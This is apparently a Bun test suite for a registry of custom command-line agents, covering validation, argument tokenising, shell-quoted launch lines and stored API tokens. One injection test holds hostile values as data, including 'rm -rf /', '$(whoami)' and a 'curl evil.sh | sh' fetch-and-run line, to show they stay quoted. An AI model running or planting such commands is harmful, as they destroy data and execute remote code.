import { test, expect } from "bun:test";
import { Database } from "bun:sqlite";
import { applyDatabaseSchema } from "./db-schema";
import { clearCommandToken, commandEnv, createCommand, deleteCommand, findCommand, listCommands, resolveBin, setCommandToken, slugify, tokenizeArgs, validateDraft } from "./commands";
import {
  capabilitiesFor,
  commandProviderId,
  commandSlug,
  isCommandProvider,
  launchOptionsFromRequest,
  parseSessionProvider,
} from "./session-provider";
import { buildCommandLaunch, commandRecogniser, procBinName, canArchiveManagedLaunch } from "./sessions";

const freshDb = () => {
  const database = new Database(":memory:");
  applyDatabaseSchema(database);
  return database;
};

/* ---------- provider identity ---------- */

test("a cmd: id parses as itself and is never coerced to Claude", () => {
  expect(parseSessionProvider("cmd:gemini")).toBe("cmd:gemini");
  expect(isCommandProvider("cmd:gemini")).toBe(true);
  expect(commandSlug("cmd:gemini")).toBe("gemini");
});

test("built-in providers keep parsing exactly as before", () => {
  expect(parseSessionProvider("claude")).toBe("claude");
  expect(parseSessionProvider("codex")).toBe("codex");
  expect(isCommandProvider("claude")).toBe(false);
});

test("malformed provider ids are rejected, not smuggled through as commands", () => {
  for (const bad of ["cmd:", "cmd:-nope", "cmd:UPPER", "cmd:has space", "cmd:" + "x".repeat(40), "bogus", "", null, 7]) {
    expect(parseSessionProvider(bad)).toBeNull();
  }
});

test("commands decline remote control, chat deletion and exact resume", () => {
  const caps = capabilitiesFor("cmd:gemini");
  expect(caps.remoteControl).toBe(false);
  expect(caps.chatDeletion).toBe(false);
  expect(caps.exactResume).toBe(false);
  expect(caps.semanticStatus).toBe(false);
  expect(caps.managedLaunch).toBe(true);
  expect(caps.webTerminal).toBe(true);
  expect(caps.freshWorkspace).toBe(true);
});

test("asking for remote control on a command is a 422-shaped refusal", () => {
  expect(launchOptionsFromRequest({ provider: "cmd:gemini", remoteControl: true }))
    .toEqual({ ok: false, error: "Remote Control is only available for Claude sessions." });
  expect(launchOptionsFromRequest({ provider: "cmd:gemini" }))
    .toEqual({ ok: true, provider: "cmd:gemini", remoteControl: false });
});

test("an omitted provider still means Claude with remote control", () => {
  expect(launchOptionsFromRequest({})).toEqual({ ok: true, provider: "claude", remoteControl: true });
});

test("a command archives on end — it has no hook phase to wait for", () => {
  expect(canArchiveManagedLaunch("cmd:gemini", null)).toBe(true);
  expect(canArchiveManagedLaunch("codex", null)).toBe(false);
});

/* ---------- validation ---------- */

test("slugify builds an id from a human label", () => {
  expect(slugify("Gemini CLI")).toBe("gemini-cli");
  expect(slugify("  Amp!!  ")).toBe("amp");
  expect(slugify("~~~")).toBe("");
});

test("resolveBin accepts something real on PATH and rejects what isn't", () => {
  const found = resolveBin("sh");
  expect(found.ok).toBe(true);
  expect(resolveBin("definitely-not-a-real-binary-xyz").ok).toBe(false);
  expect(resolveBin("").ok).toBe(false);
  expect(resolveBin("/etc/hosts").ok).toBe(false); // exists, not executable
});

test("a draft needs a name that yields a slug", () => {
  expect(validateDraft({ label: "", bin: "sh" }).ok).toBe(false);
  expect(validateDraft({ label: "~~~", bin: "sh" }).ok).toBe(false);
  expect(validateDraft({ label: "x".repeat(41), bin: "sh" }).ok).toBe(false);
});

test("arguments must be a list of plain strings", () => {
  expect(validateDraft({ label: "A", bin: "sh", args: "not a list" }).ok).toBe(false);
  expect(validateDraft({ label: "A", bin: "sh", args: [1, 2] }).ok).toBe(false);
  expect(validateDraft({ label: "A", bin: "sh", args: new Array(30).fill("-x") }).ok).toBe(false);
  const ok = validateDraft({ label: "A", bin: "sh", args: ["--yolo", "", "  -v  "] });
  expect(ok.ok && ok.draft.args).toEqual(["--yolo", "-v"]);
});

test("control characters are refused everywhere they could split a command line", () => {
  expect(validateDraft({ label: "a\u0000b", bin: "sh" }).ok).toBe(false);
  expect(validateDraft({ label: "ok", bin: "s\nh" }).ok).toBe(false);
  expect(validateDraft({ label: "ok", bin: "sh", args: ["a\u001fb"] }).ok).toBe(false);
});

/* ---------- argument tokenizing ---------- */

test("a quoted argument stays one argument", () => {
  expect(tokenizeArgs("-c 'sleep 300'")).toEqual({ ok: true, args: ["-c", "sleep 300"] });
  expect(tokenizeArgs('--msg "hello world" -v')).toEqual({ ok: true, args: ["--msg", "hello world", "-v"] });
});

test("tokenizing collapses whitespace and handles an empty line", () => {
  expect(tokenizeArgs("   ")).toEqual({ ok: true, args: [] });
  expect(tokenizeArgs("  -a   -b  ")).toEqual({ ok: true, args: ["-a", "-b"] });
});

test("an explicitly empty quoted argument survives", () => {
  expect(tokenizeArgs("--name ''")).toEqual({ ok: true, args: ["--name", ""] });
});

test("backslash escapes and nested quotes behave like a shell", () => {
  expect(tokenizeArgs("it\\ s")).toEqual({ ok: true, args: ["it s"] });
  expect(tokenizeArgs(`"say \\"hi\\""`)).toEqual({ ok: true, args: ['say "hi"'] });
  expect(tokenizeArgs("'single \"double\" inside'")).toEqual({ ok: true, args: ['single "double" inside'] });
});

test("an unclosed quote is a clear refusal, not a silent mangling", () => {
  expect(tokenizeArgs("-c 'sleep 300").ok).toBe(false);
});

test("a draft can take a typed line instead of a list", () => {
  const ok = validateDraft({ label: "A", bin: "sh", argsLine: "-c 'sleep 300'" });
  expect(ok.ok && ok.draft.args).toEqual(["-c", "sleep 300"]);
});

/* ---------- the injection guarantee ---------- */

test("a hostile label, binary or argument cannot inject a second command", () => {
  const line = buildCommandLaunch(
    { bin: "/usr/bin/agent", args: ["; rm -rf /", "$(whoami)", "`id`", "--flag='x'", "&& curl evil.sh | sh"] },
    "/home/example/workspaces/w'; rm -rf / #",
  );
  // Every dangerous token survives only inside single quotes, and the only
  // unquoted shell syntax in the line is the cd/exec skeleton we wrote ourselves.
  expect(line.startsWith("cd '/home/example/workspaces/w'\\''; rm -rf / #' && exec ")).toBe(true);
  expect(line).toContain("'; rm -rf /'");
  expect(line).toContain("'$(whoami)'");
  expect(line).toContain("'`id`'");
  const outsideQuotes = line.replace(/'(?:[^']|'\\'')*'/g, "");
  expect(outsideQuotes).not.toContain("rm -rf");
  expect(outsideQuotes).not.toContain("curl");
  expect(outsideQuotes.match(/&&/g)?.length).toBe(1); // only our own `cd … && exec`
});

test("a single quote in an argument closes and reopens rather than escaping the string", () => {
  expect(buildCommandLaunch({ bin: "/b/a", args: ["it's"] }, "/tmp")).toBe("cd '/tmp' && exec '/b/a' 'it'\\''s'");
});

/* ---------- recogniser ---------- */

test("a command is recognised by its binary's basename", () => {
  const recognises = commandRecogniser("/usr/local/bin/gemini");
  expect(recognises("/usr/local/bin/gemini --yolo")).toBe(true);
  expect(recognises("gemini --yolo")).toBe(true);
  expect(recognises("/usr/local/bin/claude --remote-control x")).toBe(false);
});

test("a deleted definition falls back to any non-wrapper descendant", () => {
  const orphaned = commandRecogniser(null);
  expect(orphaned("/usr/local/bin/gemini --yolo")).toBe(true);
  expect(orphaned("bash -lc 'cd /x && exec /y'")).toBe(false);
  expect(orphaned("SCREEN -dmS cs-x bash -lc ...")).toBe(false);
  expect(orphaned("")).toBe(false);
});

test("procBinName reads argv[0] without its directory", () => {
  expect(procBinName("/usr/local/bin/gemini --yolo")).toBe("gemini");
  expect(procBinName("gemini")).toBe("gemini");
  expect(procBinName("")).toBe("");
});

/* ---------- registry CRUD ---------- */

test("creating a command stores a resolved absolute binary and returns it", () => {
  const database = freshDb();
  const created = createCommand({ label: "Shell Agent", bin: "sh", args: ["-c", "echo hi"] }, database);
  expect(created.ok).toBe(true);
  if (!created.ok) return;
  expect(created.command.slug).toBe("shell-agent");
  expect(created.command.provider).toBe(commandProviderId("shell-agent"));
  expect(created.command.bin.startsWith("/")).toBe(true);
  expect(created.command.args).toEqual(["-c", "echo hi"]);
});

test("duplicate labels are refused rather than shadowing an existing command", () => {
  const database = freshDb();
  expect(createCommand({ label: "Agent", bin: "sh" }, database).ok).toBe(true);
  const dupe = createCommand({ label: "agent", bin: "sh" }, database);
  expect(dupe.ok).toBe(false);
});

test("list, find and delete round-trip", () => {
  const database = freshDb();
  const created = createCommand({ label: "Agent", bin: "sh" }, database);
  expect(created.ok).toBe(true);
  if (!created.ok) return;
  expect(listCommands(database).map((c) => c.slug)).toEqual(["agent"]);
  expect(findCommand("agent", database)?.label).toBe("Agent");
  expect(deleteCommand(created.command.id, database)).toBe(true);
  expect(deleteCommand(created.command.id, database)).toBe(false);
  expect(findCommand("agent", database)).toBeNull();
});

test("a corrupt args column degrades to no arguments instead of throwing", () => {
  const database = freshDb();
  database.query("INSERT INTO custom_commands (slug, label, bin, args, created_at) VALUES (?, ?, ?, ?, ?)")
    .run("broken", "Broken", "/bin/sh", "not json", Date.now());
  expect(findCommand("broken", database)?.args).toEqual([]);
});

test("findCommand refuses a slug that could not have been issued", () => {
  const database = freshDb();
  expect(findCommand("../etc", database)).toBeNull();
  expect(findCommand("UPPER", database)).toBeNull();
});


/* ---------- per-command credentials ---------- */

const withCommand = (extra: Record<string, unknown> = {}) => {
  const database = freshDb();
  const created = createCommand({ label: "Agent", bin: "sh", ...extra }, database);
  if (!created.ok) throw new Error(created.error);
  return { database, command: created.command };
};

test("an env var name is optional but must look like one", () => {
  const database = freshDb();
  expect(createCommand({ label: "A", bin: "sh", envVar: "GEMINI_API_KEY" }, database).ok).toBe(true);
  expect(createCommand({ label: "B", bin: "sh", envVar: "lower_case" }, database).ok).toBe(false);
  expect(createCommand({ label: "C", bin: "sh", envVar: "HAS SPACE" }, database).ok).toBe(false);
  expect(createCommand({ label: "D", bin: "sh", envVar: "9LEADING" }, database).ok).toBe(false);
  expect(createCommand({ label: "E", bin: "sh" }, database).ok).toBe(true); // omitted is fine
});

test("a token is refused until the command says which env var carries it", () => {
  const { database, command } = withCommand();
  const result = setCommandToken(command.id, "sk-secret", database);
  expect(result.ok).toBe(false);
  if (result.ok) return;
  expect(result.error).toContain("env var name");
});

test("a stored token never appears in the listed command", () => {
  const { database, command } = withCommand({ envVar: "GEMINI_API_KEY" });
  expect(setCommandToken(command.id, "sk-secret-value", database).ok).toBe(true);
  const listed = listCommands(database)[0]!;
  expect(listed.hasToken).toBe(true);
  expect(listed.envVar).toBe("GEMINI_API_KEY");
  expect(JSON.stringify(listed)).not.toContain("sk-secret-value");
  expect(JSON.stringify(findCommand("agent", database))).not.toContain("sk-secret-value");
});

test("the launch environment carries the token under the configured name", () => {
  const { database, command } = withCommand({ envVar: "GEMINI_API_KEY" });
  setCommandToken(command.id, "sk-secret-value", database);
  expect(commandEnv("agent", database)).toEqual({ GEMINI_API_KEY: "sk-secret-value" });
});

test("no env var, no token, or a hand-edited bad name exports nothing", () => {
  const bare = withCommand();
  expect(commandEnv("agent", bare.database)).toEqual({});

  const unset = withCommand({ envVar: "GEMINI_API_KEY" });
  expect(commandEnv("agent", unset.database)).toEqual({});

  const tampered = withCommand({ envVar: "GEMINI_API_KEY" });
  setCommandToken(tampered.command.id, "sk-x", tampered.database);
  tampered.database.query("UPDATE custom_commands SET env_var = ? WHERE id = ?").run("bad name", tampered.command.id);
  expect(commandEnv("agent", tampered.database)).toEqual({});
});

test("clearing a token leaves the command registered", () => {
  const { database, command } = withCommand({ envVar: "GEMINI_API_KEY" });
  setCommandToken(command.id, "sk-secret-value", database);
  expect(clearCommandToken(command.id, database)).toBe(true);
  expect(listCommands(database)[0]!.hasToken).toBe(false);
  expect(commandEnv("agent", database)).toEqual({});
  expect(findCommand("agent", database)).not.toBeNull();
});

test("empty, oversized and control-character tokens are refused", () => {
  const { database, command } = withCommand({ envVar: "GEMINI_API_KEY" });
  expect(setCommandToken(command.id, "   ", database).ok).toBe(false);
  expect(setCommandToken(command.id, "x".repeat(5000), database).ok).toBe(false);
  expect(setCommandToken(command.id, "sk\u0000injected", database).ok).toBe(false);
  expect(listCommands(database)[0]!.hasToken).toBe(false);
});

test("storing a token against a deleted command fails rather than resurrecting it", () => {
  const { database, command } = withCommand({ envVar: "GEMINI_API_KEY" });
  deleteCommand(command.id, database);
  expect(setCommandToken(command.id, "sk-x", database).ok).toBe(false);
});
